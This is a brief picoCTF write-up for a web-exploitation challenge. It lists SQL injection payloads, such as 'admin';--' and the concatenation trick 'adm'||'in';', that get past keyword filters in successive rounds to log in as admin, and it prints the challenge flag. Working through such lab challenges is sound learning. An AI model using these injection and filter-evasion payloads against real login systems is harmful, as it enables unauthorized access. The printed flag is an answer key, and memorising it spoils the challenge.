#web-exploitation
<hr>

#### Description

Can you beat the filters? Log in as admin [http://jupiter.challenges.picoctf.org:29164/](http://jupiter.challenges.picoctf.org:29164/) [http://jupiter.challenges.picoctf.org:29164/filter.php](http://jupiter.challenges.picoctf.org:29164/filter.php)

#### Solve
1. Round1 filter: or => in username type  `admin';--`
2. Round2 filter:  or and like = --   =>  in username type  `admin';`
3. Round3 filter: or and = like > < --  => in username type `admin';`
4. Round4 filter: or and = like > < -- admin => in username type `adm'||'in';`
5. Round5: or and = like > < -- union admin => in username type `adm'||'in';`
6. in filter.php get: // picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}